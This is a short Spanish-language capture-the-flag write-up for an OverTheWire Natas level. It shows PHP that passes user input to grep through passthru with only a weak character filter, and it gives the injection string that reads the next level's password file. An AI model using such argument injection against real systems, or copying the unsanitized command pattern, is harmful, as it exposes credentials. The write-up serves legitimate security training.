Nos recibe una página igual al nivel anterior pero con el texto `For security reasons, we now filter on certain characters`. Analizando el código notamos que se filtran ciertos caracteres de nuestra entrada:
```php
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];  
}  
  
if($key != "") {  
    if(preg_match('/[;|&]/',$key)) {  
        print "Input contains an illegal character!";  
    } else {        passthru("grep -i $key dictionary.txt");  
    }  
}  
?>
```

Se filtran los caracteres  `;`,`|` y `&`. Analizando la solución del nivel anterior, notamos que no usamos estos caracteres, así que podemos reutilizarla modificando el número del nivel: 
```
. /etc/natas_webpass/natas11 #
```

Enviando esta cadena obtenemos la contraseña del nivel siguiente.


---
## **Conclusión**

Aunque se implementaron filtros para restringir ciertos caracteres, la solución del nivel anterior funcionó, lo que demuestra que un enfoque estructurado y flexible puede ser más efectivo que los métodos improvisados.

Esto es un recordatorio de que existen múltiples soluciones válidas que pueden aplicarse a un mismo problema, y que un análisis cuidadoso del contexto puede mostrarnos caminos alternativos igualmente efectivos. 

---
-,"  
[_P